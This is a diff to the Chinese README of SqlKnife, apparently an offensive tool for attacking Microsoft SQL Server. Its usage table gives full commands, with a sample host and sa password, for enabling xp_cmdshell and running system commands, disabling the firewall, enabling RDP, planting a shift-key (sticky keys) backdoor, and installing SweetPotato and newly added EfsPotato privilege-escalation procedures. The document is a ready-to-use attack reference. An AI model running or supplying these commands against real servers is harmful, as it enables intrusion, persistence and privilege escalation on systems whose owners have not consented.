@@ -61,7 +61,7 @@ SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123  --oacreate -c calc.ex
 
 ![Snipaste_2021-08-03_10-56-34](img/Snipaste_2021-08-03_10-56-34.png)
 
-### 开RDP，关防火墙加规则（开RDP时自动加），装shift后门
+### 开RDP，关防火墙加规则（开RDP时自动加），劫持shift键
 
 权限足够的前提下，基于注册表的操作
 
@@ -111,6 +111,12 @@ SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --dbup -c whoami
 
 ![Snipaste_2021-08-03_11-29-11](img/Snipaste_2021-08-03_11-29-11.png)
 
+### EfsPotato
+
+#### 安装并执行命令
+
+![](img/Snipaste_2021-08-05_19-40-49.png)
+
 ### 启用/还原配置功能
 
 ![Snipaste_2021-08-03_11-29-35](img/Snipaste_2021-08-03_11-29-35.png)
@@ -126,18 +132,20 @@ SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --dbup -c whoami
 
 ## 0x04 使用方法 
 
-| 语法                                                         | 功能                                                        |
-| :----------------------------------------------------------- | :---------------------------------------------------------- |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --xpcmd --fix | 启用xp_cmdshell，其他fix类型功能都是这个格式                |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --xpcmd -c whoami | 使用xp_cmdshell执行命令，其他命令执行功能也是这个格式       |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --xpcmd --remove | 禁用xp_cmdshell，其他remove类型功能也是这个格式             |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --oacreate --fix | 恢复Ole Automation Procedures                               |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123  --oacreate -c calc.exe | Ole Automation Procedures执行程序                           |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --openrdp | 开启RDP                                                     |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --disfw | 关闭防火墙                                                  |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --shift | 劫持shift键                                                 |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --dbup --fix  --3 | 安装.net3.5的甜土豆提权存储过程，如果安装.net4.0的话就是--4 |
-| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --dbup -c whoami | 利用甜土豆执行命令                                          |
+| 语法                                                         | 功能                                                         |
+| :----------------------------------------------------------- | :----------------------------------------------------------- |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --xpcmd --fix | 启用xp_cmdshell，其他fix类型功能都是这个格式                 |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --xpcmd -c whoami | 使用xp_cmdshell执行命令，其他命令执行功能也是这个格式        |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --xpcmd --remove | 禁用xp_cmdshell，其他remove类型功能也是这个格式              |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --oacreate --fix | 恢复Ole Automation Procedures                                |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123  --oacreate -c calc.exe | Ole Automation Procedures执行程序                            |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --openrdp | 开启RDP                                                      |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --disfw | 关闭防火墙                                                   |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --shift | 劫持shift键                                                  |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --dbup --fix  --3 | 安装.net3.5的甜土豆提权存储过程，如果安装.net4.0的话就是--4  |
+| SqlKnife.exe -H 192.168.49.143 -P 1433 -u sa -p admin@123 --dbup -c whoami | 利用甜土豆执行命令                                           |
+| SqlKnife.exe -H 192.168.49.143 -u sa -p admin@123 --dbup2 --3 --fix | 安装.net3.5的EfsPotato提权存储过程，如果安装.net4.0的话就是--4 |
+| SqlKnife.exe -H 192.168.49.143 -u sa -p admin@123 --dbup2 -c whoami | 使用EfsPotato执行命令                                        |
 
 ## 0x06 实现原理
 
